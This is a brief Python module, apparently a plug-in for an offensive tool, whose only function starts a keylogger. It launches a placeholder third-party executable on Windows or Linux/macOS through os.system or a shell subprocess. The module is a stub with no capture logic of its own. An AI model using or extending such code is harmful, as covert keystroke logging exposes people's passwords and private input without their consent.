######################################################################################################################################################################## 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”).
# Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
# and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A  
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################

import os
import subprocess

def start_keylogging():
    if os.name == 'nt':
        # Windows keylogging example using a third-party tool
        command = 'path\\to\\keylogger.exe'
        os.system(command)
        return "Keylogging started on Windows"

    elif os.name == 'posix':
        # Linux/MacOS keylogging example using a third-party tool
        command = 'path/to/keylogger'
        subprocess.Popen(command, shell=True)
        return "Keylogging started on Linux/MacOS"

def execute(*args):
    return start_keylogging()

if __name__ == "__main__":
    print(start_keylogging())

